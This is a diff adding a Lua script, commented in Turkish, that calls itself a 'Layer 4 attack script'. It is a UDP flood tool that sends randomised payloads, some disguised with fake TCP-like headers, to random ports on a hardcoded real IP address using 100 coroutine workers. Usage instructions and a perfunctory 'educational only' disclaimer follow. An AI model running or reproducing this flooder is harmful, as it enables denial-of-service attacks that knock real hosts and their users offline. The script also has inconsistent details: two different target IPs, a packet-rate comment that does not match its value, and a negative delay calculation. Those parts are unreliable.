@@ -1,0 +1,236 @@
+--[[
+#####################################################################
+#                LAYER 4 SALDIRI SCRIPTİ - RANDOM PORT              #
+#                HEDEF: 57.128.64.146                                #
+#                PROTOKOL: UDP (LAYER 4)                             #
+#                ÖZELLİKLER:                                         #
+#                - Her paket rastgele port                           #
+#                - Her paket rastgele payload                        #
+#                - Yüksek performans için coroutine                  #
+#                - Optimize edilmiş delay hesaplaması                #
+#####################################################################
+--]]
+
+local socket = require("socket")
+local math = require("math")
+local string = require("string")
+local os = require("os")
+
+-- HEDEF BİLGİLERİ
+local HEDEF_IP = "135.125.189.86"
+local HEDEF_PORT = 27753  -- Başlangıç portu, rastgele seçilecek
+
+-- PERFORMANS AYARLARI (SİSTEMİNE GÖRE AYARLA)
+local WORKER_SAYISI = 100        -- Aynı anda çalışacak işçi sayısı
+local HEDEF_PPS = 1000       -- Saniyede hedeflenen toplam paket (1 Milyon)
+local MAX_PAYLOAD_BOYUTU = 1024 -- Maksimum payload boyutu (byte)
+local MIN_PAYLOAD_BOYUTU = 604   -- Minimum payload boyutu (byte)
+
+-- Rastgelelik için seed ayarla
+math.randomseed(os.time())
+math.randomseed(math.random(1, 1000000) + os.time())
+for i = 1, 10 do math.random() end
+
+-- Worker başına PPS hesapla
+local PPS_PER_WORKER = HEDEF_PPS / WORKER_SAYISI
+local DELAY_SANIYE = -100 / PPS_PER_WORKER  -- Worker başına paketler arası bekleme (saniye)
+local DELAY_MIKRO = DELAY_SANIYE * 1000000  -- Mikrosaniye cinsinden
+
+-- =================================================================
+-- RASTGELE PAYLOAD OLUŞTURUCU
+-- Her çağrıldığında farklı, rastgele bir payload üretir
+-- =================================================================
+local function rastgele_payload_olustur()
+    -- Rastgele boyut belirle
+    local boyut = math.random(MIN_PAYLOAD_BOYUTU, MAX_PAYLOAD_BOYUTU)
+    
+    -- Rastgele byte dizisi oluştur
+    local payload_tablosu = {}
+    
+    -- İlk birkaç byte'ı belirli bir pattern ile başlat (opsiyonel, tanınmayı zorlaştırır)
+    if math.random() > 0.7 then
+        -- TCP benzeri header ekle (aldatmaca)
+        payload_tablosu[1] = math.random(0, 255)  -- Source Port (high byte)
+        payload_tablosu[2] = math.random(0, 255)  -- Source Port (low byte)
+        payload_tablosu[3] = math.random(0, 255)  -- Dest Port (high byte)
+        payload_tablosu[4] = math.random(0, 255)  -- Dest Port (low byte)
+        payload_tablosu[5] = math.random(0, 255)  -- Sequence number (byte 1)
+        payload_tablosu[6] = math.random(0, 255)  -- Sequence number (byte 2)
+        payload_tablosu[7] = math.random(0, 255)  -- Sequence number (byte 3)
+        payload_tablosu[8] = math.random(0, 255)  -- Sequence number (byte 4)
+        
+        -- Kalan byte'ları tamamen rastgele doldur
+        for i = 9, boyut do
+            payload_tablosu[i] = math.random(0, 255)
+        end
+    else
+        -- Tamamen rastgele payload
+        for i = 1, boyut do
+            payload_tablosu[i] = math.random(0, 255)
+        end
+    end
+    
+    -- String'e çevir
+    local payload_string = ""
+    for i = 1, #payload_tablosu do
+        payload_string = payload_string .. string.char(payload_tablosu[i])
+    end
+    
+    return payload_string, boyut
+end
+
+-- =================================================================
+-- RASTGELE PORT SEÇİCİ
+-- 1-65535 arası rastgele port döndürür
+-- =================================================================
+local function rastgele_port_sec()
+    -- Dinamik/private port aralığı (49152-65535) daha sık kullanılır
+    if math.random() > 0.3 then
+        -- Private port aralığı (daha gerçekçi)
+        return math.random(49152, 65535)
+    else
+        -- Tüm port aralığı
+        return math.random(1025, 65535)  -- 1024 altı system portları, genelde kullanılmaz
+    end
+end
+
+-- =================================================================
+-- İŞÇİ (WORKER) FONKSİYONU
+-- Her işçi sürekli olarak rastgele portlara payload gönderir
+-- =================================================================
+local function isci_calistir(isci_numarasi)
+    -- Her işçi için ayrı UDP socket
+    local udp_socket = socket.udp()
+    udp_socket:settimeout(0)  -- Non-blocking mod
+    
+    -- Socket buffer'ı büyüt (performans için)
+    udp_socket:setoption("broadcast", true)
+    
+    -- İstatistikler
+    local gonderilen_paket = 0
+    local gonderilen_byte = 0
+    local baslangic_zamani = os.clock()
+    local son_log_zamani = baslangic_zamani
+    
+    while true do
+        -- Rastgele port seç
+        local hedef_port = rastgele_port_sec()
+        
+        -- Rastgele payload oluştur
+        local payload, boyut = rastgele_payload_olustur()
+        
+        -- Paketi gönder
+        local basari, hata = pcall(function()
+            udp_socket:sendto(payload, HEDEF_IP, hedef_port)
+        end)
+        
+        if basari then
+            gonderilen_paket = gonderilen_paket + 1
+            gonderilen_byte = gonderilen_byte + boyut
+            
+            -- Log (isteğe bağlı, performansı düşürebilir)
+            local simdiki_zaman = os.clock()
+            if simdiki_zaman - son_log_zamani >= 1.0 then  -- Saniyede bir log
+                local gecen_sure = simdiki_zaman - baslangic_zamani
+                local paket_hizi = gonderilen_paket / gecen_sure
+                local mbps = (gonderilen_byte * 8) / (gecen_sure * 1000000)
+                
+                print(string.format(
+                    "[İşçi %d] Paket: %d | Hız: %.2f pps | Bant: %.2f Mbps | Son Port: %d | Payload: %d byte",
+                    isci_numarasi, gonderilen_paket, paket_hizi, mbps, hedef_port, boyut
+                ))
+                
+                son_log_zamani = simdiki_zaman
+            end
+        else
+            print("[İŞÇİ " .. isci_numarasi .. "] HATA: " .. tostring(hata))
+        end
+        
+        -- Delay - CPU kullanımını optimize et
+        if DELAY_MIKRO > 0 then
+            -- Mikrosaniye hassasiyetinde bekleme
+            socket.sleep(DELAY_SANIYE)
+        else
+            -- Çok yüksek hız için yield yap
+            coroutine.yield()
+        end
+    end
+end
+
+-- =================================================================
+-- COROUTINE YÖNETİCİSİ
+-- =================================================================
+print("╔════════════════════════════════════════════════════════════╗")
+print("║         LAYER 4 SALDIRI SİSTEMİ AKTİF                      ║")
+print("╠════════════════════════════════════════════════════════════╣")
+print(string.format("║ Hedef IP      : %s", HEDEF_IP))
+print(string.format("║ Worker Sayısı : %d", WORKER_SAYISI))
+print(string.format("║ Hedef PPS     : %d", HEDEF_PPS))
+print(string.format("║ Payload Boyutu: %d-%d byte", MIN_PAYLOAD_BOYUTU, MAX_PAYLOAD_BOYUTU))
+print("║ Port Aralığı  : 1025-65535 (Rastgele)                     ║")
+print("║ Payload Tipi  : Tamamen Rastgele + TCP Header Taklidi     ║")
+print("╚════════════════════════════════════════════════════════════╝")
+print("")
+
+-- İşçi thread'lerini oluştur
+local isciler = {}
+for i = 1, WORKER_SAYISI do
+    isciler[i] = coroutine.create(function()
+        isci_calistir(i)
+    end)
+    print("[SİSTEM] İşçi " .. i .. " oluşturuldu.")
+end
+
+print("\n[SİSTEM] Tüm işçiler başlatılıyor... HEDEF: " .. HEDEF_IP .. "\n")
+
+-- Ana scheduler döngüsü
+local baslangic = os.clock()
+local sayac = 0
+
+while true do
+    for i = 1, WORKER_SAYISI do
+        if coroutine.status(isciler[i]) ~= "dead" then
+            local basari, hata = coroutine.resume(isciler[i])
+            if not basari then
+                print("[HATA] İşçi " .. i .. " çöktü: " .. tostring(hata))
+                -- Yeni işçi oluştur
+                isciler[i] = coroutine.create(function()
+                    isci_calistir(i)
+                end)
+            end
+            sayac = sayac + 1
+        end
+    end
+    
+    -- Her 10000 döngüde bir genel durum raporu
+    if sayac % 10000 == 0 then
+        local calisan_zaman = os.clock() - baslangic
+        print(string.format("[DURUM] %.2f saniyedir aktif | Döngü: %d", calisan_zaman, sayac))
+    end
+    
+    -- CPU'yu çok yormamak için küçük bir bekleme
+    -- NOT: Yüksek performans için bunu yorum satırı yap
+    -- socket.sleep(0.000001)
+end
+
+--[[
+#####################################################################
+#                           KULLANIM TALİMATLARI                     #
+#####################################################################
+1. LuaSocket kütüphanesinin kurulu olduğundan emin ol:
+   Ubuntu/Debian: sudo apt-get install lua-socket
+   
+2. Scripti çalıştır:
+   lua bu_dosya.lua
+   
+3. Performans ayarları:
+   - WORKER_SAYISI: Sisteminin CPU çekirdek sayısına göre ayarla
+   - HEDEF_PPS: Ağ kartının kapasitesine göre ayarla
+   - MAX_PAYLOAD_BOYUTU: MTU'yu aşmamaya dikkat et (genelde 1500)
+   
+4. YASAL UYARI:
+   Bu script sadece eğitim amaçlıdır. İzinsiz ağlara saldırı yapmak
+   yasalara aykırıdır ve ciddi cezaları vardır. Sorumluluk tamamen
+   kullanıcıya aittir.
+#####################################################################
+--]]
